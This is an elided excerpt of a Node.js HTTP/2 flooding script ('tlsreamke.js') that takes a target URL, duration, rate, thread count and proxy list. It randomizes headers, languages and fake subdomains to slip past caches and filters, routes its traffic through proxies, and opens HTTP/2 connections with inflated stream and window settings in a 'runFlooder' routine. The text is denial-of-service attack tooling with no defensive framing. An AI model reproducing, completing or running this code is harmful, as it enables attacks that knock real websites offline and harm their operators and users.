...
'*'
 ...
 if (process.argv.length < 7){console.log(`node tlsreamke.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
...
function getRandomUserAgent() {
    ...
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'af', 'ar-dz'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'AF' ,'AR'];
  ...
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers[":authority"] = randomString(20) + "." + parsedTarget.host;
  headers["accept"] = randomHeaders['accept'];
  headers["Accept-Encoding"] = "gzip, deflate, br";
  headers["accept-language"] = headerFunc.lang();
  headers["accept-encoding"] = headerFunc.encoding();
  headers["Connection"] = Math.random() > 0.9 ? "keep-alive" : "close";
  headers["upgrade-insecure-requests"] = Math.random() > 0.5;
  headers["x-requested-with"] = "XMLHttpRequest";
  headers["pragma"] = Math.random() > 0.7 ? "no-cache" : "max-age=3";
  headers["cache-control"] = Math.random() > 0.4 ? "no-cache" : "max-age=1";
 ...
 function runFlooder() {
     ...
     Header.HTTP(proxyOptions, (connection, error) => {
         ...
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65539,
            maxConcurrentStreams: 20000,
            initialWindowSize: 62914956 * 100,
            maxHeaderListSize: 2621440 * 100,
            enablePush: false
          },
